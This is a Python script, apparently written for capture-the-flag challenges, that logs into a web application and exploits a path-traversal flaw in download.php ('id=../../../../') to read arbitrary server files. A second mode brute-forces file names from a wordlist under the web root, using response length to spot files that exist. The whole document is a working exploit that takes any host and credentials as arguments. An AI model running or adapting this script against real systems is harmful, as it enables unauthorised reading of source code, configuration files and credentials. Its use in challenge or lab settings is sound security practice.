#!/usr/bin/env python3
"""File-existence oracle + source reader for challenges exposing arbitrary file read.

Usage:
  python oracle.py <host:port> <user> <pass> <wordlist> [prefix]
  python oracle.py --read <host:port> <user> <pass> <path>
"""
import concurrent.futures
import sys
import urllib.parse
import urllib.request
import http.cookiejar

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/120.0 Safari/537.36")


def session(host, user, passwd):
    cj = http.cookiejar.CookieJar()
    op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
    op.addheaders = [("User-Agent", UA)]
    base = "http://" + host
    try:
        op.open(base + "/login.php", timeout=8).read()
        op.open(urllib.request.Request(base + "/login.php",
                data=("username=%s&password=%s" % (user, passwd)).encode()), timeout=8).read()
    except Exception as e:
        print("login warn:", e)
    return op, base


def fetch(op, url, nbytes=200000):
    try:
        r = op.open(url, timeout=8)
        return r.status, r.read(nbytes)
    except urllib.error.HTTPError as e:
        try:
            return e.code, e.read(nbytes)
        except Exception:
            return e.code, b""
    except Exception as e:
        return 0, str(e).encode()[:80]


def main():
    if sys.argv[1] == "--read":
        host, user, passwd, path = sys.argv[2], sys.argv[3], sys.argv[4], sys.argv[5]
        op, base = session(host, user, passwd)
        st, body = fetch(op, base + "/download.php?id=../../../../" +
                         urllib.parse.quote(path, safe="/"))
        sys.stdout.write(body.decode("utf-8", "replace"))
        return

    host, user, passwd, wl = sys.argv[1:5]
    prefix = sys.argv[5] if len(sys.argv) > 5 else "var/www/html/"
    op, base = session(host, user, passwd)
    words = [w.strip() for w in open(wl, encoding="utf-8") if w.strip()]

    def probe(w):
        st, body = fetch(op, base + "/download.php?id=../../../../" +
                         urllib.parse.quote(prefix + w, safe="/"), 300)
        if st == 200 and len(body) != 24:  # 24 == "错误：文件不存在"
            return (w, st, body[:100])
        return None

    with concurrent.futures.ThreadPoolExecutor(max_workers=6) as ex:
        for r in ex.map(probe, words):
            if r:
                print(r)


if __name__ == "__main__":
    main()
